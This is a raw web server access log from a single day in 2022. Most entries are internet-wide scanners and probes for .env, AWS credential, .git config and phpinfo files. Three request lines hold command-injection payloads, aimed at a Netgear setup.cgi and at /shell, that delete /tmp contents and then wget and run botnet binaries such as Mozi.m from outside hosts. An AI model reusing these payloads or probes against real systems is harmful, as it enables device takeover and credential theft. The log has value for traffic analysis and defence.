135.125.217.54 - - [11/Sep/2022:01:41:57 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.248.133.46 - - [11/Sep/2022:02:44:06 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.248.133.46 - - [11/Sep/2022:02:44:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.46 - - [11/Sep/2022:02:44:07 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
65.49.20.69 - - [11/Sep/2022:02:46:18 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
192.241.221.109 - - [11/Sep/2022:02:48:06 +0000] "GET /hudson HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
65.49.20.97 - - [11/Sep/2022:02:50:32 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
135.125.217.54 - - [11/Sep/2022:02:54:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [11/Sep/2022:02:54:40 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.242.173 - - [11/Sep/2022:03:02:10 +0000] "GET /0bef HTTP/1.0" 404 196 "-" "-"
135.125.217.54 - - [11/Sep/2022:03:29:35 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [11/Sep/2022:03:29:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
1.246.222.69 - - [11/Sep/2022:03:51:03 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.246.222.69:3566/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 196 "-" "-"
128.14.134.134 - - [11/Sep/2022:03:57:28 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.217.54 - - [11/Sep/2022:05:04:49 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [11/Sep/2022:05:04:49 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:35 +0000] "GET //_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:35 +0000] "GET //phpinfo.php HTTP/1.1" 404 16 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:35 +0000] "GET //phpinfo HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:36 +0000] "GET //aws.yml HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:36 +0000] "GET //.env.bak HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:36 +0000] "GET //info.php HTTP/1.1" 404 16 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:37 +0000] "GET //.aws/credentials HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:37 +0000] "GET //.git/config HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:37 +0000] "GET //frontend_dev.php/$ HTTP/1.1" 404 16 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:38 +0000] "GET // HTTP/1.1" 200 32 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:38 +0000] "GET //config.js HTTP/1.1" 404 196 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.39.194.158 - - [11/Sep/2022:05:09:38 +0000] "GET //debug/default/view?panel=config HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:39 +0000] "GET //test.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:39 +0000] "GET //i.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:39 +0000] "GET //php.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:40 +0000] "GET //php_info.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:40 +0000] "GET //phptest.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:40 +0000] "GET //index.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:41 +0000] "GET //dashboard/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:41 +0000] "GET //infophp.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:42 +0000] "GET //p.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:42 +0000] "GET //php-info.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:43 +0000] "GET //testphp.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:43 +0000] "GET //info.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:44 +0000] "GET //phpinfo1.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:45 +0000] "GET //test1.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:45 +0000] "GET //info1.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:45 +0000] "GET //phpinfo2.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:46 +0000] "GET //pinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:46 +0000] "GET //scripts/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:46 +0000] "GET //inf.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:47 +0000] "GET //phpinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:47 +0000] "GET //admin/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:48 +0000] "GET //admin/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:48 +0000] "GET //test2.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:49 +0000] "GET //index1.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:49 +0000] "GET //forum/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:49 +0000] "GET //phpinfo/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:50 +0000] "GET //token.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:50 +0000] "GET //ini.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:51 +0000] "GET //in.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:51 +0000] "GET //phpinfos.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:52 +0000] "GET //scripts/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:52 +0000] "GET //test4.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:53 +0000] "GET //foo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:53 +0000] "GET //php/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:53 +0000] "GET //dev.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:54 +0000] "GET //test3.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:54 +0000] "GET //phpinfo.txt HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:55 +0000] "GET //info2.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:55 +0000] "GET //forum/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:56 +0000] "GET //administrator/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:56 +0000] "GET //root/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:56 +0000] "GET //root/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:57 +0000] "GET //infos.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:57 +0000] "GET //admin/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:58 +0000] "GET //test1 HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:58 +0000] "GET //phpinfo.html HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:59 +0000] "GET //o.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:09:59 +0000] "GET //administrator/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:00 +0000] "GET //apache.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:00 +0000] "GET //dashboard/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:00 +0000] "GET //scripts/index.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:01 +0000] "GET //rest.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:01 +0000] "GET //phpinfo/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:02 +0000] "GET //infophp/testphp.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:02 +0000] "GET //phpinfo3.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:03 +0000] "GET //php1.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:03 +0000] "GET //dashboard/test.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:04 +0000] "GET //console/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:04 +0000] "GET //info4.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:04 +0000] "GET //infophp/index.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:05 +0000] "GET //console/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:05 +0000] "GET //info3.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:05 +0000] "GET //deploy.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:06 +0000] "GET //dashboard/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:06 +0000] "GET //root/infophp HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:06 +0000] "GET //scripts/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:07 +0000] "GET //env/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:07 +0000] "GET //phpinfo/php-details.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:08 +0000] "GET //php-info HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:09 +0000] "GET //phpdetails HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:09 +0000] "GET //php_details HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:10 +0000] "GET //information.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:10 +0000] "GET //information HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:10 +0000] "GET //phpinformation HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:11 +0000] "GET //old_phpinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:11 +0000] "GET //phpversion.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:11 +0000] "GET //admin/infophp.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:12 +0000] "GET //admin/dashboard/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:12 +0000] "GET //admin/dashboard/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:13 +0000] "GET //admin/dashboard/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:13 +0000] "GET //dashboard/admin/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:13 +0000] "GET //dashboard/admin/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:14 +0000] "GET //dashboard/admin/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:14 +0000] "GET //dashboardadmin/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:15 +0000] "GET //dashboardadmin/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:16 +0000] "GET //dashboardadmin/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:16 +0000] "GET //tools/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:16 +0000] "GET //tools/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:17 +0000] "GET //tools/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:17 +0000] "GET //webdav/phpinfo.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:18 +0000] "GET //webdav/phpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:18 +0000] "GET //webdav/info.php HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:18 +0000] "GET //testphpinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:19 +0000] "GET //testphpinfo HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:19 +0000] "GET //check.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:19 +0000] "GET //pi.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:19 +0000] "GET //local-phpinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:20 +0000] "GET //local-info.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:20 +0000] "GET //admin.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:20 +0000] "GET //_phpinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:20 +0000] "GET //PHPConf.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:21 +0000] "GET //viewinfo.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
20.39.194.158 - - [11/Sep/2022:05:10:22 +0000] "GET //testing.php HTTP/1.1" 404 16 "-" "python-requests/2.28.1"
138.68.183.225 - - [11/Sep/2022:05:19:56 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:05:49:05 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:05:49:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.151 - - [11/Sep/2022:05:57:45 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.241.219.31 - - [11/Sep/2022:06:24:51 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
135.125.244.48 - - [11/Sep/2022:08:28:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:08:28:55 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.162.235.116 - - [11/Sep/2022:08:48:26 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
185.162.235.116 - - [11/Sep/2022:08:48:27 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.162.235.116 - - [11/Sep/2022:08:48:27 +0000] "GET /WuEL HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)"
185.162.235.116 - - [11/Sep/2022:08:48:33 +0000] "GET /a HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.162.235.116 - - [11/Sep/2022:08:48:34 +0000] "GET /download/file.ext HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.162.235.116 - - [11/Sep/2022:08:48:34 +0000] "GET /SiteLoader HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.162.235.116 - - [11/Sep/2022:08:48:35 +0000] "GET /mPlayer HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:08:56:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:08:57:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.186.62 - - [11/Sep/2022:09:40:18 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
135.125.244.48 - - [11/Sep/2022:10:02:45 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:10:02:45 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.178.120.159 - - [11/Sep/2022:10:12:15 +0000] "GET / HTTP/1.1" 200 32 "http://54.199.218.165:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
23.251.102.74 - - [11/Sep/2022:10:12:36 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.251.102.74 - - [11/Sep/2022:10:12:37 +0000] "GET /webfig/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
118.69.60.229 - - [11/Sep/2022:11:07:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
135.125.244.48 - - [11/Sep/2022:12:12:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:12:12:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [11/Sep/2022:12:56:50 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
135.125.244.48 - - [11/Sep/2022:12:59:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:12:59:09 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.62 - - [11/Sep/2022:13:26:21 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.94.138.62 - - [11/Sep/2022:13:26:21 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [11/Sep/2022:13:26:22 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
192.241.214.169 - - [11/Sep/2022:13:42:41 +0000] "MGLNDD_54.199.218.165_80\n" 400 226 "-" "-"
190.36.174.148 - - [11/Sep/2022:14:45:13 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
72.143.39.222 - - [11/Sep/2022:14:46:00 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
218.145.61.20 - - [11/Sep/2022:14:48:58 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 46.19.141.122/0xxx0xxxasdajshdsajhkgdja/meth.arm4;chmod+777+/tmp/meth.arm4;sh+/tmp/meth.arm4" 400 226 "-" "-"
135.125.244.48 - - [11/Sep/2022:14:49:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:14:49:09 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
